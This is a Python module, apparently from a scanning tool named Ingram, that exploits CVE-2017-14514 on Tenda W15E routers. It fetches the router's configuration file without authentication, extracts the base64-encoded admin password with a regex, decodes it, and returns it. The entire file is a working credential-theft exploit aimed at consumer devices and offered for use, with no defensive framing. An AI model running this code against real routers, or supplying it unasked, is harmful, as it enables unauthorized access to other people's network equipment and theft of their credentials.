"""tenda w15e router config-file disclosure"""
import base64
import re
import requests

from Ingram.utils import config
from Ingram.utils import logger


def cve_2017_14514(ip: str) -> list:
    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
    url = f"http://{ip}/cgi-bin/DownloadCfg/RouterCfm.cfg"

    try:
        r = requests.get(url, timeout=config.TIMEOUT, verify=False, headers=headers)
        if r.status_code == 200:
            b64 = re.findall(r'sys\.userpass=(.*)', r.text)
            if b64: b64 = b64[0]
            passwd = base64.b64decode(b64.encode()).decode()

            return [True, '', passwd, 'cve-2017-14514']
    except Exception as e:
        logger.error(e)
    return [False, ]